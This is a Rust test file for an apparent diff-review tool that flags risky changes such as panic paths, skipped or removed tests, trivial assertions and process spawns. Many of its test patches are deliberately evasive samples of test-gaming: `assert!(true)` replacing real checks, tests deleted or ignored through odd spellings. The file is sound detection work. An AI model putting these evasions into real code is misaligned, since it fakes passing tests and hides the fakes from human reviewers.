            &["+    let v = a::unwrap::b(x);"][..],
            &["+    X::unwrap!(x);"][..],
            &["+fn f(a: a::unwrap) {}"][..],
            &["+impl X { fn unwrap(self) {} }"][..],
        ] {
            assert_eq!(found(&hunk_of("src/p.rs", body)), [], "{body:?}");
        }
        // Inside another macro's body the answers are the same answers. (The parser named
        // nothing there: the path over two lines was `syntax_unchecked`, and so was the
        // value.)
        let inside = |lines: &[&str]| {
            let mut body = vec![" // ctx", "+outer! {"];
            body.extend_from_slice(lines);
            body.extend_from_slice(&["+}", " // ctx"]);
            found(&hunk_of("src/x.rs", &body))
                .iter()
                .map(|item| (item.0, item.1))
                .collect::<Vec<_>>()
        };
        assert_eq!(
            inside(&["+    let v = X::unwrap(x);"]),
            [(S::PanicPathAdded, Basis::Lexical)]
        );
        assert_eq!(
            inside(&["+    let v = X::", "+        unwrap(x);"]),
            [(S::PanicPathAdded, Basis::Hunk)]
        );
        assert_eq!(inside(&["+    let v = it.map(X::unwrap);"]), []);
    }

    /// Review V3 round 9, VD3R9-M-1: a removed `#[r#test]` is a removed test. The rule was
    /// three exact tokens, and the code view blanks a raw prefix to two spaces, so
    /// `#[  test]` matched none of them. Third independent review, IR3-L-4: with arguments
    /// (`#[tokio::test(flavor = "multi_thread")]`) or over lines it was not read either. The
    /// attribute is read from the tokens of the old side.
    #[test]
    fn a_removed_test_attribute_is_read_whatever_its_spelling() {
        for line in [
            "#[test]",
            "#[r#test]",
            "# [ test ]",
            "#[tokio::test]",
            "#[r#tokio::r#test]",
            "#[ tokio :: test ]",
            "#[rstest]",
            "#[r#rstest]",
            "    #[test] // was slow",
            // IR3-L-4
            "#[tokio::test(flavor = \"multi_thread\")]",
            "#[rstest(a, b)]",
            // A `#` straight after a name. This one was not read, the line rule wanting no
            // name before the `#`; up to edition 2018 `x#[test]` is the tokens `x`, `#`, `[`,
            // `test`, `]` to the compiler, and a macro can drop the name (from edition 2021 it
            // is an error).
            "let a = x#[test];",
        ] {
            let found: Vec<(EvidenceSignal, Side, u32)> =
                file_evidence(&removed("tests/x.rs", &[line, "fn t() {}"]))
                    .iter()
                    .map(|e| (e.signal, e.side, e.line))
                    .collect();
            assert_eq!(found, [(S::TestRemoved, Side::Old, 2)], "{line}");
            // adding one is not evidence of anything
            assert_eq!(signals(&added("tests/x.rs", &[line])), [], "{line}");
        }
        for line in [
            "#[testing]",
            "#[test_case(1)]",
            "#[cfg(test)]",
            "#![test]",
            "// #[test]",
            "let s = \"#[test]\";",
        ] {
            assert_eq!(signals(&removed("tests/x.rs", &[line])), [], "{line}");
        }
        // Vesper's second file
        let file = parse(
            "diff --git a/tests/raw_removed.rs b/tests/raw_removed.rs\n--- a/tests/raw_removed.rs\n+++ b/tests/raw_removed.rs\n@@ -1,3 +1,2 @@\n-#[r#test]\n fn check() {}\n fn stays() {}\n",
        )
        .unwrap()
        .remove(0);
        let items: Vec<(EvidenceSignal, Side, u32)> = file_evidence(&file)
            .iter()
            .map(|e| (e.signal, e.side, e.line))
            .collect();
        assert_eq!(items, [(S::TestRemoved, Side::Old, 1)]);
        // the third review's two patches (`tr1.patch`, `tr2.patch`): each gave nothing
        for body in [
            &[
                "-#[tokio::test(flavor = \"multi_thread\")]",
                "-async fn checks_the_ledger() {",
                "-    assert_eq!(ledger_total().await, 4);",
                "-}",
                "+// removed",
            ][..],
            &[
                "-#[",
                "-  test",
                "-]",
                "-fn checks_the_ledger() {",
                "-    assert_eq!(ledger_total(), 4);",
                "-}",
                "+// removed",
            ][..],
        ] {
            let items: Vec<(EvidenceSignal, Side, u32)> =
                file_evidence(&hunk_of("src/tr.rs", body))
                    .iter()
                    .map(|e| (e.signal, e.side, e.line))
                    .collect();
            assert_eq!(items, [(S::TestRemoved, Side::Old, 2)], "{body:?}");
        }
    }

    /// Second independent review, IR2-M-2: the rows of its table. Each compiles and behaves
    /// as its plain spelling does, and each left neither an item nor `syntax_unchecked`. All
    /// seven are items. The seventh was declared a miss until 2026-11-14 (review round 12):
    /// after `/* /* */ // */` the code view took the rest of the line for a comment, where
    /// the compiler nests block comments. The view now reads Rust as the compiler's lexer
    /// does, in plain code and inside another macro's body (the corpus expects both).
    #[test]
    fn the_rows_of_the_second_reviews_table() {
        let rows: &[(&[&str], &[Item])] = &[
            (
                &["+    let v = x.r#unwrap();"],
                &[(S::PanicPathAdded, Basis::Lexical, 11)],
            ),
            (
                &["+    let v = x.r#expect(\"set\");"],
                &[(S::PanicPathAdded, Basis::Lexical, 11)],
            ),
            (
                &["+    let v = it.map(Option::r#unwrap);"],
                &[(S::PanicPathAdded, Basis::Lexical, 11)],
            ),
            (
                &["+    #[r#ignore]", "+    fn t() {}"],
                &[(S::TestSkipped, Basis::Lexical, 11)],
            ),
            (
                &["+    let f = Option::<u32>::unwrap;"],
                &[(S::PanicPathAdded, Basis::Lexical, 11)],
            ),
            (
                &[
                    "+    #[cfg_attr(all(), cfg_attr(all(), ignore))]",
                    "+    fn t() {}",
                ],
                &[(S::TestSkipped, Basis::Lexical, 11)],
            ),
            // after a nested comment (declared a miss until the code view nested them)
            (
                &["+    /* /* */ // */ let v = Result::unwrap(x);"],
                &[(S::PanicPathAdded, Basis::Lexical, 11)],
            ),
        ];
        for (lines, expected) in rows {
            // the review's shape: a hunk at line 10 of an existing file, a comment line
            // before and after
            let mut text = format!(
                "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -10,2 +10,{} @@\n // ctx\n",
                lines.len() + 2
            );
            for line in *lines {
                text.push_str(line);
                text.push('\n');
            }
            text.push_str(" // ctx\n");
            let file = parse(&text).unwrap().remove(0);
            assert_eq!(found(&file), *expected, "{lines:?}");
        }
        // the nested conditional skip on a line of 70 KB: the same answer
        let pad = "a".repeat(70_000);
        assert_eq!(
            found(&hunk_of(
                "tests/a.rs",
                &[&format!(
                    "+#[cfg_attr(all(), cfg_attr(all(), ignore))] // {pad}"
                )]
            )),
            [(S::TestSkipped, Basis::Lexical, 2)]
        );
        for line in [
            "+#[cfg_attr(all(), cfg_attr(ignore, allow(x)))]",
            "+#[cfg_attr(all(), serde(cfg_attr(all(), ignore)))]",
        ] {
            assert_eq!(
                found(&hunk_of("tests/a.rs", &[line, "+struct A;"])),
                [],
                "{line}"
            );
            assert_eq!(
                found(&hunk_of("tests/a.rs", &[&format!("{line} // {pad}")])),
                [],
                "{line}"
            );
        }
    }

    /// Review V3 round 4, VD3R4-M-1, and round 5, VD3R5-M-1: inside another macro's body the
    /// parser named no construct, and a rule that read one line could not follow an assertion
    /// over three. There was nothing, then a mark that it was not checked. Read as tokens it
    /// is the assertion it is, on its first line.
    #[test]
    fn a_construct_inside_a_macro_body_over_several_lines_is_read() {
        let forwarded = found(&new_file(
            "tests/m.rs",
            &[
                "macro_rules! outer {",
                "    ($($tt:tt)*) => { $($tt)* };",
                "}",
                "outer! {",
                "    assert!(",
                "        true",
                "    );",
                "}",
            ],
        ));
        assert_eq!(forwarded, [(S::TrivialAssert, Basis::Hunk, 5)]);
        // VD3R5-M-1: the outer macro on the same row is not the assertion. (Before: the mark,
        // on the line of the unread word.)
        let cases: &[(&[&str], &[Item])] = &[
            (
                &["outer! { assert!(", "    true", "); }"],
                &[(S::TrivialAssert, Basis::Hunk, 1)],
            ),
            (
                &[
                    "outer! { #[cfg_attr(",
                    "    miri,",
                    "    ignore",
                    ")] fn a() {} }",
                ],
                &[(S::TestSkipped, Basis::Hunk, 1)],
            ),
            (
                &["a!(); outer! { std::assert!(", "    true", "); }"],
                &[(S::TrivialAssert, Basis::Hunk, 1)],
            ),
            (
                &[
                    "outer! {",
                    "    #[cfg_attr(",
                    "        miri,",
                    "        ignore",
                    "    )]",
                    "    #[test]",
                    "    fn a() {}",
                    "}",
                ],
                &[(S::TestSkipped, Basis::Hunk, 2)],
            ),
            (
                &["outer! {", "    assert!(true);", "}"],
                &[(S::TrivialAssert, Basis::Lexical, 2)],
            ),
            (
                &["fn a() {", "    assert!(", "        true", "    );", "}"],
                &[(S::TrivialAssert, Basis::Hunk, 2)],
            ),
            // not trivial, inside a macro's body or outside, and not an assertion at all
            (
                &["fn a() {", "    assert!(", "        b()", "    );", "}"],
                &[],
            ),
            (
                &["outer! {", "    my_assert!(", "        true", "    );", "}"],
                &[],
            ),
            // (before: `syntax_unchecked`, since no rule could read it to its end)
            (
                &[
                    "outer! {",
                    "    assert!(b(), \"{}\", c(",
                    "        d",
                    "    ));",
                    "}",
                ],
                &[],
            ),
        ];
        for (body, expected) in cases {
            assert_eq!(found(&new_file("tests/m.rs", body)), *expected, "{body:?}");
        }
    }

    /// In a new file a panic path stands whatever attribute is above it. (These were the
    /// cases that fell short of the proof of test code, while there was one.)
    #[test]
    fn a_panic_path_in_a_new_file_stands_whatever_attribute_is_above_it() {
        let stands: &[(&[&str], u32)] = &[
            (&["#[test]", "fn a() {", "    f().unwrap();", "}"], 3),
            (
                &[
                    "#[tokio::test]",
                    "async fn a() {",
                    "    f().await.expect(\"x\");",
                    "}",
                ],
                3,
            ),
            // Vesper's reproductions: an attribute imported under a test framework's name, a
            // dependency renamed to a test framework's, and the same done to `test` itself
            (
                &[
                    "use tracing::instrument as rstest;",
                    "#[rstest]",
                    "pub fn production() {",
                    "    load().unwrap();",
                    "}",
                ],
                4,
            ),
            (
                &[
                    "use some_macros::passthrough as test;",
                    "#[test]",
                    "pub fn production() {",
                    "    load().unwrap();",
                    "}",
                ],
                4,
            ),
            // an attribute macro before the cfg, or around the item, may drop the cfg
            (
                &[
                    "#[strip]",
                    "#[cfg(test)]",
                    "pub fn production() {",
                    "    load().unwrap();",
                    "}",
                ],
                4,
            ),
            (
                &[
                    "#[strip]",
                    "mod outer {",
                    "    #[cfg(test)]",
                    "    pub fn production() {",
                    "        load().unwrap();",
                    "    }",
                    "}",
                ],
                5,
            ),
            // the function after the one under `cfg(test)` is not under it
            (
                &[
                    "#[cfg(test)]",
                    "fn helper() {}",
                    "fn real() {",
                    "    f().unwrap();",
                    "}",
                ],
                4,
            ),
        ];
        for (body, line) in stands {
            assert_eq!(
                found(&new_file("src/a.rs", body)),
                [(S::PanicPathAdded, Basis::Lexical, *line)],
                "{body:?}"
            );
        }
    }

    /// A hunk from the middle of a file proves nothing, whatever it shows: above it a comment
    /// can be open that ends on the attribute's own line, and then this function is in the
    /// program. Its panic path stands.
    #[test]
    fn a_hunk_from_the_middle_of_a_file_keeps_its_panic_path() {
        let middle = parse(
            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -40,4 +40,5 @@\n  notes\n #[cfg(test)] // */\n pub fn production() {\n+    load().unwrap();\n }\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(found(&middle), [(S::PanicPathAdded, Basis::Lexical, 43)]);
        for body in [
            &[
                " #[cfg(test)]",
                " mod checks {",
                "+    fn helper() { f().unwrap(); }",
                " }",
            ][..],
            &[
                "+#[cfg(test)]",
                "+fn helper() {",
                "+    f().unwrap();",
                "+}",
            ][..],
        ] {
            let items = found(&hunk_of("src/a.rs", body));
            assert_eq!(
                items.iter().map(|i| (i.0, i.1)).collect::<Vec<_>>(),
                [(S::PanicPathAdded, Basis::Lexical)],
                "{body:?}"
            );
        }
        let unseen = found(&hunk_of("tests/a.rs", &["+    f().unwrap();"]));
        assert_eq!(unseen, [(S::PanicPathAdded, Basis::Lexical, 2)]);
    }

    /// A panic path is read wherever it stands, in a hunk of any size, and only where it is a
    /// call: a longer name, a comment, a string, a bare name and a removed line are none.
    #[test]
    fn a_panic_path_is_read_wherever_it_stands_and_only_as_a_call() {
        // inside a macro's body
        assert_eq!(
            found(&hunk_of("src/a.rs", &["+    outer! { x.unwrap(); }"])),
            [(S::PanicPathAdded, Basis::Lexical, 2)]
        );
        // on a line of 70 KB (the parser did not read such a hunk, and it said so with a
        // second item, `syntax_unchecked`)
        let long = format!("+    f().unwrap(); // {}", "a".repeat(70_000));
        assert_eq!(
            found(&hunk_of("src/a.rs", &[long.as_str()])),
            [(S::PanicPathAdded, Basis::Lexical, 2)]
        );
        // after a line of 64 KiB of `}`
        let braces = format!("+{}", "}".repeat(64 << 10));
        assert_eq!(
            found(&hunk_of("src/big.rs", &[&braces, "+    y.unwrap();"])),
            [(S::PanicPathAdded, Basis::Lexical, 3)]
        );
        for line in [
            "+    x.unwrap_or(1);",
            "+    x.expect_err(\"e\");",
            "+    let s = \"a.unwrap()\"; // b.unwrap()",
            "+    unwrap(x);",
            "-    f().unwrap();",
        ] {
            assert_eq!(found(&hunk_of("src/a.rs", &[line])), [], "{line}");
        }
        // another language has no such rule
        assert_eq!(found(&hunk_of("a.py", &["+x.unwrap()"])), []);
    }

    /// The items of the line rules and of the token reader come out together: in line order,
    /// and on a line in the order of [`EvidenceSignal::ALL`].
    #[test]
    fn the_items_of_both_kinds_of_rule_keep_one_order() {
        let file = hunk_of(
            "src/a.rs",
            &[
                "+    let c = std::process::Command::new(\"x\");",
                "+    let v = unsafe { f() }.unwrap();",
                "+    todo!()",
                "+    #[allow(x)] #[ignore] fn t() { assert!(true); todo!(); a.unwrap(); }",
            ],
        );
        assert_eq!(
            found(&file),
            [
                (S::ProcessSpawn, Basis::Lexical, 2),
                (S::UnsafeAdded, Basis::Lexical, 3),
                (S::PanicPathAdded, Basis::Lexical, 3),
                (S::StubAdded, Basis::Lexical, 4),
                (S::CheckSuppressed, Basis::Lexical, 5),
                (S::TestSkipped, Basis::Lexical, 5),
                (S::TrivialAssert, Basis::Lexical, 5),
                (S::StubAdded, Basis::Lexical, 5),
                (S::PanicPathAdded, Basis::Lexical, 5),
            ]
        );
    }

    /// These are read on added lines only: removing a skip or a stub is the repair.
    #[test]
    fn removing_a_skip_a_trivial_assert_or_a_stub_is_not_evidence() {
        for (path, line) in [
            ("tests/a.rs", "#[ignore]"),
            ("tests/a.rs", "    assert!(true);"),
            ("src/a.rs", "    todo!()"),
            ("test_a.py", "@pytest.mark.skip"),
            ("a.py", "    raise NotImplementedError"),
        ] {
            assert_eq!(signals(&removed(path, &[line])), [], "{path}: {line}");
        }
    }

    #[test]
    fn labels_and_weights_are_the_documented_table() {
        let table: Vec<(&str, u32)> = EvidenceSignal::ALL
            .iter()
            .map(|s| (s.label(), s.weight()))
            .collect();
        assert_eq!(
            table,
            [
                ("unsafe_added", 4),
                ("process_spawn", 4),
                ("network_fetch", 3),
                ("dynamic_eval", 4),
                ("ci_privilege", 4),
                ("build_hook", 3),
                ("secret_like", 5),
                ("check_suppressed", 2),
                ("test_removed", 3),
                ("test_skipped", 3),
                ("trivial_assert", 3),
                ("stub_added", 3),
                ("error_swallowed", 3),
                ("panic_path_added", 3),
            ]
        );
        assert_eq!((Side::New.label(), Side::Old.label()), ("new", "old"));
        assert_eq!(
            (Basis::Lexical.label(), Basis::Hunk.label()),
            ("lexical", "hunk")
        );
        assert_eq!(EVIDENCE_BASIS, "lexical");
        assert_eq!(MAX_EVIDENCE_PER_FILE, 32);
        // the reader's items are merged by this order
        let mut ordered = EvidenceSignal::ALL;
        ordered.sort();
        assert_eq!(ordered, EvidenceSignal::ALL);
    }

    #[test]
    fn hunk_signals_agree_with_file_evidence() {
        let patch = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,2 +1,3 @@\n a\n+unsafe { f() }\n ctx\n@@ -10,2 +11,4 @@\n b\n+#[allow(x)]\n+let c = std::process::Command::new(\"x\");\n ctx\n";
        let file = parse(patch).unwrap().remove(0);
        let per_hunk: Vec<Vec<EvidenceSignal>> = (0..file.patch_twin.hunks.len())
            .map(|index| hunk_signals(&file, index).unwrap())
            .collect();
        assert_eq!(hunk_signals(&file, 2), None);
        assert_eq!(hunk_signals_alone(&file, 2, &FileKinds::of(&file)), None);
        assert_eq!(
            per_hunk,
            [
                vec![S::UnsafeAdded],
                vec![S::ProcessSpawn, S::CheckSuppressed]
            ]
        );
        for (hunk, signals) in file.patch_twin.hunks.iter().zip(&per_hunk) {
            let mut from_file: Vec<EvidenceSignal> = file_evidence(&file)
                .into_iter()
                .filter(|e| e.hunk == hunk.id)
                .map(|e| e.signal)
                .collect();
            from_file.sort();
            from_file.dedup();
            assert_eq!(&from_file, signals);
        }
    }

    #[test]
    fn a_prefix_token_needs_only_a_boundary_before() {
        assert!(token_in("def test_x():", "def test*"));
        assert!(token_in("os.execvp(a)", "os.exec*"));
        assert!(!token_in("pos.execvp(a)", "os.exec*"));
        assert!(!token_in("xdef test_x", "def test*"));
        // The byte before a prefix token, away from the start of the line.
        assert!(token_in("x = os.execvp(a)", "os.exec*"));
        assert!(token_in("f(os.execvp(a))", "os.exec*"));
        assert!(!token_in("x = a.os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = $os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = _os.execvp(a)", "os.exec*"));
        assert!(token_in("a unsafe b", "unsafe"));
    }
    /// Review V3 round 1, VD3-H-1: an attribute that only mentions `test` proves no test, so the
    /// panic path under it stands. Before, `#[cfg_attr(any(), test)]` on a production function
    /// made the item disappear.
    #[test]
    fn a_false_test_context_does_not_withdraw_a_panic_path() {
        let stands: &[(&[&str], bool)] = &[
            (
                &[
                    "+#[cfg_attr(any(), test)]",
                    "+pub fn production() {",
                    "+    load().unwrap();",
                    "+}",
                ],
                false,
            ),
            (
                &[
                    "+#[cfg_attr(feature = \"x\", test)]",
                    "+pub fn production() {",
                    "+    load().unwrap();",
                    "+}",
                ],
                false,
            ),
            // review V3 round 2, VD3R2-H-1: an unknown path that ends in `test` (it spells a
            // test, so it has the hint, and the item stands)
            (
                &[
                    "+#[my_framework::test]",
                    "+pub fn production() {",
                    "+    load().unwrap();",
                    "+}",
                ],
                true,
            ),
            (
                &[
                    "+#[my_attribute(test)]",
                    "+pub fn production() {",
                    "+    load().unwrap();",
                    "+}",
                ],
                false,
            ),
            (
                &[
                    "+#[cfg(not(test))]",
                    "+mod real {",
                    "+    pub fn production() {",
                    "+        load().unwrap();",
                    "+    }",
                    "+}",
                ],
                false,
            ),
            (
                &[
                    "+mod tests {",
                    "+    pub fn production() {",
                    "+        load().unwrap();",
                    "+    }",
                    "+}",
                ],
                false,
            ),
        ];
        for (body, hinted) in stands {
            let items: Vec<(EvidenceSignal, Basis, bool)> =
                file_evidence(&hunk_of("src/a.rs", body))
                    .iter()
                    .map(|e| (e.signal, e.basis, e.test_likely))
                    .collect();
            assert_eq!(
                items,
                [(S::PanicPathAdded, Basis::Lexical, *hinted)],
                "{body:?}"
            );
        }
        // and so does one under a real `#[cfg(test)]` in a new file: nothing is withdrawn
        let real = found(&new_file(
            "src/a.rs",
            &["#[cfg(test)]", "fn a() {", "    load().unwrap();", "}"],
        ));
        assert_eq!(real, [(S::PanicPathAdded, Basis::Lexical, 3)]);
    }

    /// Review V3 round 1, VD3-M-1: a change inside a construct that started on an unchanged
    /// line is a change to the construct, reported on the added line.
    #[test]
    fn an_added_line_inside_a_construct_that_spans_lines_is_evidence() {
        let assertion = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn checks() {",
                "     assert!(",
                "-        computes_answer()",
                "+        true",
                "     );",
            ],
        ));
        assert_eq!(assertion, [(S::TrivialAssert, Basis::Hunk, 4)]);
        // Review V3 round 2, VD3R2-M-1: a construct that was already what it is now is not
        // added by a change to its message. Before, these three were reported. No token of
        // `todo!(` or of `assert!(true,` is on an added line: a string is blank, and what
        // follows the construct is not part of it.
        for (path, body) in [
            (
                "src/m.rs",
                &[" fn f() {", "     todo!(", "+        \"later\"", "     )"][..],
            ),
            (
                "src/m.rs",
                &[
                    " fn later() {",
                    "     todo!(",
                    "-        \"old message\"",
                    "+        \"new message\"",
                    "     )",
                ][..],
            ),
            (
                "tests/m.rs",
                &[
                    " fn check() {",
                    "     assert!(",
                    "         true,",
                    "-        \"old message\"",
                    "+        \"new message\"",
                    "     );",
                ][..],
            ),
        ] {
            assert_eq!(found(&hunk_of(path, body)), [], "{body:?}");
        }
        // a stub that replaces what was there is added, on the added line
        let stub = found(&hunk_of(
            "src/m.rs",
            &[
                " fn f() -> u8 {",
                "     compute(",
                "-        1",
                "+        todo!()",
                "     )",
            ],
        ));
        assert_eq!(stub, [(S::StubAdded, Basis::Lexical, 4)]);
        // an unchanged construct beside an added line is still not evidence
        let beside = found(&hunk_of(
            "tests/m.rs",
            &[" fn checks() {", "     assert!(true);", "+    let a = 1;"],
        ));
        assert_eq!(beside, []);
        // a `catch` whose empty block is on the next line
        let catch = found(&hunk_of(
            "web/a.ts",
            &[
                " try { work(); }",
                "-catch (e) { report(e); }",
                "+catch",
                "+{ }",
            ],
        ));
        assert_eq!(catch, [(S::ErrorSwallowed, Basis::Hunk, 3)]);
        let bound = found(&hunk_of(
            "web/a.ts",
            &[" try { work(); }", "+catch (e)", "+{}"],
        ));
        assert_eq!(bound, [(S::ErrorSwallowed, Basis::Hunk, 3)]);
        // a block with something in it is not
        let handled = found(&hunk_of(
            "web/a.ts",
            &[" try { work(); }", "+catch (e)", "+{ report(e); }"],
        ));
        assert_eq!(handled, []);
    }

    /// Third independent review, IR3-M-4. The parser took a macro's arguments as text with the
    /// whitespace removed, comments included, so `true // always` read `true//always` and the
    /// assertion was "not trivial"; nothing marked it, the word `assert` being the
    /// construct's own name. A comment is blank in the code view the tokens are cut from. The
    /// review's six patches: the first compiled and ran, `test checks ... ok`.
    #[test]
    fn a_comment_inside_an_assertion_is_no_token_of_it() {
        let trivial = |line: u32, basis: Basis| vec![(S::TrivialAssert, basis, line)];
        // `ca1.patch`, `ca2.patch`, `ca3.patch`: new files
        assert_eq!(
            found(&new_file(
                "src/ca1.rs",
                &[
                    "#[test]",
                    "fn checks() {",
                    "    assert!(",
                    "        true // always",
                    "    );",
                    "}",
                ]
            )),
            trivial(3, Basis::Hunk)
        );
        assert_eq!(
            found(&new_file(
                "src/ca2.rs",
                &[
                    "#[test]",
                    "fn checks() {",
                    "    assert!(",
                    "        true /* always */, \"msg\"",
                    "    );",
                    "}",
                ]
            )),
            trivial(3, Basis::Hunk)
        );
        assert_eq!(
            found(&new_file(
                "src/ca3.rs",
                &[
                    "#[test]",
                    "fn checks() {",
                    "    assert!(true /* always */);",
                    "    assert!(/* c */ true);",
                    "}",
                ]
            )),
            [
                (S::TrivialAssert, Basis::Lexical, 3),
                (S::TrivialAssert, Basis::Lexical, 4)
            ]
        );
        // `ca4.patch`, `ca5.patch`, `ca6.patch`: a change under an unchanged `assert!(`
        assert_eq!(
            found(&hunk_of(
                "src/ca4.rs",
                &[
                    " #[test]",
                    " fn checks() {",
                    "     assert!(",
                    "-        compute() == 4,",
                    "+        true, // compute() == 4",
                    "         \"msg\"",
                    "     );",
                    " }",
                ]
            )),
            trivial(5, Basis::Hunk)
        );
        assert_eq!(
            found(&hunk_of(
                "src/ca5.rs",
                &[
                    " #[test]",
                    " fn checks() {",
                    "     assert!(",
                    "-        compute() == 4",
                    "+        // compute() == 4",
                    "+        true",
                    "     );",
                    " }",
                ]
            )),
            trivial(6, Basis::Hunk)
        );
        assert_eq!(
            found(&hunk_of(
                "src/ca6.rs",
                &[
                    " #[test]",
                    " fn checks() {",
                    "     assert_eq!(",
                    "-        compute(),",
                    "-        4",
                    "+        true, // compute(),",
                    "+        true",
                    "     );",
                    " }",
                ]
            )),
            trivial(5, Basis::Hunk)
        );
    }

    /// Third independent review, IR3-M-3. Where the grammar read a comment and the compiler
    /// reads code, a construct that only the parser found left nothing: `įĪ` inside a block
    /// comment read as `/*` to the grammar's scanner, so the lines after it were a comment to
    /// the parser, and the call over three lines was found by no one. The code view is right
    /// about these lines, and the tokens are cut from it. The first compiled and ran to a
    /// panic.
    #[test]
    fn a_construct_the_grammar_took_for_a_comment_is_read() {
        // `gc1.patch`, `gc2.patch`, `gc3.patch`, `gc4.patch`
        assert_eq!(
            found(&new_file(
                "src/gc1.rs",
                &[
                    "pub fn production(x: Option<u32>) -> u32 {",
                    "    /* įĪ */ let v = x",
                    "        .unwrap",
                    "        (); // */",
                    "    v",
                    "}",
                ]
            )),
            [(S::PanicPathAdded, Basis::Hunk, 3)]
        );
        assert_eq!(
            found(&new_file(
                "src/gc2.rs",
                &[
                    "pub fn production(x: Option<u32>) -> u32 {",
                    "    let r#Ģ = 1; let v = x",
                    "        .unwrap",
                    "        (); // \"#",
                    "    ; v + r#Ģ",
                    "}",
                ]
            )),
            [(S::PanicPathAdded, Basis::Hunk, 3)]
        );
        assert_eq!(
            found(&new_file(
                "src/gc3.rs",
                &[
                    "#[test]",
                    "fn checks() {",
                    "    /* įĪ */ assert!(",
                    "        true",
                    "    ); // */",
                    "}",
                ]
            )),
            [(S::TrivialAssert, Basis::Hunk, 3)]
        );
        assert_eq!(
            found(&new_file(
                "src/gc4.rs",
                &[
                    "/* įĪ */ #[test] #[",
                    "    ignore] // */",
                    "fn checks() {",
                    "    assert_eq!(compute(), 4);",
                    "}",
                ]
            )),
            [(S::TestSkipped, Basis::Hunk, 1)]
        );
    }

    /// Third independent review, IR3-M-5. A method call with generic arguments was no
    /// construct to the parser, and the line rule wanted `(` straight after the name. Each of
    /// these compiles (`expect::<'static>` with a warning) and panics: `tf1.patch` to
    /// `tf5.patch`. The three with `::<>` were `syntax_unchecked`, the two with a lifetime
    /// nothing.
    #[test]
    fn a_method_call_with_generic_arguments_is_a_panic_path() {
        for call in [
            "b().unwrap::<>()",
            "b().expect::<>(\"no\")",
            "b().expect::<'static>(\"no\")",
        ] {
            let body = [
                "fn b() -> Option<u32> { None }",
                "pub fn production() -> u32 {",
                &format!("    let v = {call};"),
                "    v",
                "}",
            ];
            assert_eq!(
                found(&new_file("src/tf.rs", &body)),
                [(S::PanicPathAdded, Basis::Lexical, 3)],
                "{call}"
            );
        }
        for call in ["b().unwrap::<>()", "b().expect::<'_>(\"no\")"] {
            let body = [
                " fn b() -> Option<u32> { None }",
                " pub fn production() -> u32 {",
                "-    let v = b().unwrap_or(1);",
                &format!("+    let v = {call};"),
                "     v",
                " }",
            ];
            assert_eq!(
                found(&hunk_of("src/tf.rs", &body)),
                [(S::PanicPathAdded, Basis::Lexical, 4)],
                "{call}"
            );
        }
    }

    /// Review V3 round 1, VD3-L-1: more spellings of the same things.
    #[test]
    fn other_spellings_of_a_skip_a_swallowed_rejection_and_a_panic_path_are_evidence() {
        let lexical = |signal| vec![(signal, Basis::Lexical, 2)];
        assert_eq!(
            found(&hunk_of(
                "web/a.test.ts",
                &["+test.skipIf(isCI)(\"adds\", () => {});"]
            )),
            lexical(S::TestSkipped)
        );
        // the function form, in plain code and inside another macro's body
        for line in [
            "+let v = Result::unwrap(read());",
            "+let v = Option::expect(first(), \"one\");",
        ] {
            assert_eq!(
                found(&hunk_of("src/u.rs", &[line])),
                lexical(S::PanicPathAdded),
                "{line}"
            );
            assert_eq!(
                found(&hunk_of(
                    "src/u.rs",
                    &[&format!("+outer! {{ {} }}", &line[1..])]
                )),
                lexical(S::PanicPathAdded),
                "{line}"
            );
        }
        for line in [
            "+run().catch(() => {});",
            "+p.catch(()=>{});",
            "+p.catch(e => {});",
            "+p.catch((e) => { });",
            "+p.catch(async (e) => {});",
            "+p.catch(function () {});",
            "+p.catch(function(e) { });",
            // review V3 round 2, VD3R2-L-1: a default value that calls a function
            "+run().catch((error = fallback()) => {});",
            "+run().catch(function (error = fallback()) {});",
            "+run().catch(async (error = fallback(a, (b))) => {});",
            "+run().catch(function onError(error) {});",
        ] {
            assert_eq!(
                found(&hunk_of("web/p.ts", &[line])),
                [(S::ErrorSwallowed, Basis::Hunk, 2)],
                "{line}"
            );
        }
        // a handler that does something, a named handler, and other calls named catch are not
        for line in [
            "+p.catch((e) => { report(e); });",
            "+p.catch(report);",
            "+p.catch(() => report());",
            "+p.catch(() => ({}));",
            "+cache.catchUp(() => {});",
            "+p.catch();",
            "+p.catch((error = fallback() => {});",
            "+p.catch((error = fallback()) => { report(error); });",
        ] {
            assert_eq!(found(&hunk_of("web/p.ts", &[line])), [], "{line}");
        }
        // a conditional skip is still reported: under some configuration the test does not run
        assert_eq!(
            found(&hunk_of(
                "tests/t.rs",
                &["+#[cfg_attr(miri, ignore)]", "+#[test]", "+fn a() {}"]
            ))
            .iter()
            .map(|i| i.0)
            .collect::<Vec<_>>(),
            [S::TestSkipped]
        );
    }

    /// Review V3 round 2, VD3R2-H-2, round 3, VD3R3-H-2, and the second independent review,
    /// IR2-H-5. While a parser read the hunks, a review had budgets (bytes, then also the
    /// squares of bytes), a plan that spent them in the review's order, and a mark for the
    /// hunks left unread: whoever ordered the hunks decided which were parsed. There is no
    /// budget now. Each hunk's answer is its own, whatever stands before it in the review:
    /// the same files that once spent the budget after three hunks each give their item.
    #[test]
    fn every_hunk_of_a_review_is_read_whatever_came_before_it() {
        // each hunk: one added line of about 12 KB, then an added panic path
        let filler = format!("+    let x = {};", "1 + ".repeat(3_000) + "1");
        let files: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/f{n}.rs"), &[&filler, "+    y.unwrap();"]))
            .collect();
        let ranked = crate::rank(&files);
        assert_eq!(ranked.len(), files.len());
        for (file, ranked) in files.iter().zip(&ranked) {
            // (before: `syntax_fragment` for the first three, then the item with
            // `syntax_unchecked` beside it)
            assert_eq!(found(file), [(S::PanicPathAdded, Basis::Lexical, 3)]);
            let items: Vec<(EvidenceSignal, Basis, u32)> = ranked
                .evidence
                .iter()
                .map(|e| (e.signal, e.basis, e.line))
                .collect();
            assert_eq!(items, [(S::PanicPathAdded, Basis::Lexical, 3)]);
        }
        // a review of typical size, forty hunks of 2 KiB with a panic path in each
        let filler = format!("+    let x = {};", "1 + ".repeat(500) + "1");
        for n in 0..40 {
            let file = hunk_of(&format!("src/t{n}.rs"), &[&filler, "+    y.unwrap();"]);
            assert_eq!(
                found(&file),
                [(S::PanicPathAdded, Basis::Lexical, 3)],
                "{n}"
            );
